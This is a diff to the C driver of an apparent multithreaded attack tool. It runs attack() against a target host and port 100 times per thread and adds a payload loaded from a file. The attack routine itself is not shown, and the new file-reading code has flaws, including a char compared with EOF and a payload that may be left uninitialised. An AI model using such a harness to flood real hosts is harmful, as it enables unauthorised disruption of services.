@@ -10,6 +10,7 @@
 #include "attacker/attacker.h"
 
 #define ATTACKS_PER_THREAD 100
+#define BUFFER_SIZE 100
 
 
 // struct that contains values to be used in thread function (run_100_attacks)
@@ -17,6 +18,7 @@ struct thread_args {
     char *host;
     char *ip;
     int16_t port;
+    char *payload;
 };
 
 
@@ -34,6 +36,34 @@ void print_help(void) {
 }
 
 
+char *read_file(char *filename) {
+    FILE *file;
+    int file_size;
+    char *string;
+    char c;
+    int i;
+
+    file = fopen(filename, "r");
+    if (file == NULL) return NULL;
+
+    fseek(file, 0, SEEK_END); // set the stream position to the end of the file
+    file_size = ftell(file);  // returns the position
+    fseek(file, 0, SEEK_SET); // set the stream position to the beginning of the file
+
+    string = (char *) malloc(sizeof(char) * (file_size+1));
+    i = 0;
+    // Read all the characters from the file
+    while ((c = fgetc(file)) != EOF) {
+        string[i] = c;
+        i++;
+    }
+    string[i] = '\0';
+
+    fclose(file);
+    return string;
+}
+
+
 // Thread function that runs 100 attack
 void *run_100_attacks(void *args) {
     size_t i;
@@ -41,7 +71,7 @@ void *run_100_attacks(void *args) {
 
     t_args = (struct thread_args *) args;
     for (i = 0; i < ATTACKS_PER_THREAD; i++) {
-        attack(t_args->host, t_args->ip, t_args->port);
+        attack(t_args->host, t_args->ip, t_args->port, t_args->payload);
     }
 }
 
@@ -50,7 +80,7 @@ int main(int argc, char *argv[]) {
     struct timeval start, end;
     gettimeofday(&start, NULL);
 
-    char *host, *ip;
+    char *host, *ip, *payload, *payload_filename;
     int port, host_length;
     size_t i, num_attacks;
 
@@ -84,10 +114,14 @@ int main(int argc, char *argv[]) {
         printf("amount of attacks must be at least 100\n");
         exit(1);
     }
+    if (argc > 4) {
+        payload_filename = argv[4];
+        payload = read_file(payload_filename);
+    }
 
     // set the amount of threads after setting the amount of attacks
     num_threads = num_attacks / ATTACKS_PER_THREAD;
-    all_threads_id = (pthread_t *) malloc(num_threads * sizeof(pthread_t));
+    all_threads_id = (pthread_t *) malloc(sizeof(pthread_t) * num_threads);
 
     // get ip from host_entry converting array of address in to in_addr and the 
     // converting to ascii (inet_ntoa)
@@ -109,6 +143,7 @@ int main(int argc, char *argv[]) {
     t_args.host = host;
     t_args.ip = ip;
     t_args.port = port;
+    t_args.payload = payload;
 
     // run the threads
     for (i = 0; i < num_threads; i++) {
